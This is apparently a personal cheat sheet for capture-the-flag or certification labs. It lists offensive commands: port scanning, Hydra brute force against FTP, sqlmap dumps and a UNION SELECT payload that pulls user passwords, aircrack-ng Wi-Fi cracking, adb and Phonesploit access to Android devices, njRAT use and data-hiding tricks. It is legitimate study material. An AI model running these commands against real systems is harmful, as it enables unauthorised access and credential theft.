ftp
smb
hydra
greenbone
aircrack (no need wordlist for "WEP.cap" file)
RAT - njRAT (search for the sa_code.txt)
BC-TextEncoder

------------------------------------------------------------------------------------------------------------------------------------------------

To find the live host connected to one subnet / host discovery:
nmap -sn 192.168.29.1 (last no. give 1) /24

or

Sudo netdiscover -r 192.168.29.1/24

subnet: IP/24


sudo masscan $IP -p1-65535,U:1-65535 --rate=2000 | tee open_ports


cat open_port | cut -d ' ' -f 4 | cut -d '/' -f 1


nmap -A $IP -p(ports) -T4 | tee open_services


To crack the password using Hydra:
hydra -l jenny -P /usr/share/seclists/Passwords/Common-Credentials/best1050.txt 10.10.159.162 ftp -V -f (to stop when the passsword is found)

--------------------------------------------------------------------------------------------------------------------------------------------------

smbclient -L \\\\IP\\
To connect with smb using username:
smbclient -L ////IP// --user <name>

To mount the shares:
mkdir /mnt/smb_share - create a dir in the mount file

mount -t cifs //10.129.131.234/backups(share name) /mnt/smb_share -o username=name

To unmount the shares:
umount -l -t cifs /mnt/smb_share

----------------------------------------------------------------------------------------------------------------------------------------------------

Subdomain search:
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://FUZZ.thetoppers.htb/


Directory search:
wfuzz -Z -c -z file,/usr/share/seclists/Discovery/Web-Content/common.txt --sc 200 http://10.10.74.245/FUZZ/


sub-domain:
wfuzz -Z -c -z file,/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --sc 200 http://FUZZ.thetopper.htb/

-------------------------------------------------------------------------------------------------------------------------------------------------

severity scan (End of life): Greenbone Tool

scan -> Tasks

Task wizard -> Enter the IP and then start scan

------------------------------------------------------------------------------------------------------------------------------------------------

Wifi password Cracking:
sudo aircrack-ng <cap file> -w <passwordlist>

-------------------------------------------------------------------------------------------------------------------------------------------------

Veracrypt:
select file (that secret file ) -> mount -> (then the cracked password)

and then find the code in eg.txt

-------------------------------------------------------------------------------------------------------------------------------------------------

IoT
wireshark:
open the cap file in wireshark
Type "mqtt" in the top -> search for publish message length -> and type the msg length

-------------------------------------------------------------------------------------------------------------------------------------------------

sqlmap
2 ways: 
1. Request file
2. Http url

without login:
1.
sqlmap -u http://www.moviescope.com/ --forms 

sqlmap -u http://www.moviescope.com/ --forms --dbs

sqlmap -u http://www.moviescope.com/ --forms -D <database name> --tables

sqlmap -u http://www.moviescope.com/ --forms -D <database name> -T table name --columns


2.
in the req.txt file where ever you put * sql injection will be done there
sqlmap -r req

sqlmap -r req --dbs

sqlmap -r req -D <database name> --tables

sqlmap -r req -D <database name> -T table name --columns

-------------------------------------------------------------------------------------------------------------------------------------------------
DoS
wireshark:
.pcapng
statistics -> check for the highest amount of "count"

------------------------------------------------------------------------------------------------------------------------------------------------

Malware analyst
PE Explorer - to find the entry point
file -> open file - add the file to PE

------------------------------------------------------------------------------------------------------------------------------------------------

privilege esc:
go to the root dir and check for the eg.txt

sudo -l 
winPEAS
Metasploit

-----------------------------------------------------------------------------------------------------------------------------------------------

port - 5555 -----> Android Device

adb connect 10.10.1.14:5555

adb devices

adb shell

use "ls" to list the files and then use phonesploit

find / -name README 2>/dev/null

find /home/Scan -name elf 2>/dev/null


By using Phonesploit:
cd phonesploit

python phonesploit.py

Enter IP add

9 - pull folder from phone to pc

scan - folder name yu want to pull

. - where yu want to pull

zip the folder yu have pulled

On python server in cmd and transfer the folder to windows system

open Detect It Easy(DIE):

open file - check one by one entropy value and then check for the highest value

and now calculate the hash value

----------------------------------------------------------------------------------------------------------------------------------------------

SQL Injection:

'+UNION+SELECT+username,+password+FROM+users--

---------------------------------------------------------------------------------------------------------------------------------------------

Stegnography:

Openstego - to extract the data from the image

Snow: 
SNOW.EXE -C -p password -m "ransomeware" steg.txt cipher.txt
SNOW.EXE -C -p password cipher.txt

Data windows Alternate Stream:
To hide:
echo "Secret message" > new.txt:secret.txt

To read:
notepad new.txt:secret.txt

To see the hidden data in cmd:
dir /R

-----------------------------------------------------------------------------------------------------------------------------------------------

ssh username@IP

----------------------------------------------------------------------------------------------------------------------------------------------

njRAT - open a file using njrat 
aftr yu connect to the machine
right click on the detected machine --> select manager or open folder

---------------------------------------------------------------------------------------------------------------------------------------------

To Search in ftp:
lftp username@<IP>
find . | grep flag.txt
find
find .

---------------------------------------------------------------------------------------------------------------------------------------------

nikto -h <website> -Tuning x

---------------------------------------------------------------------------------------------------------------------------------------------
search only from the dir where yu are:
grep -rn flag.txt

----------------------------------------------------------------------------------------------------------------------------------------------
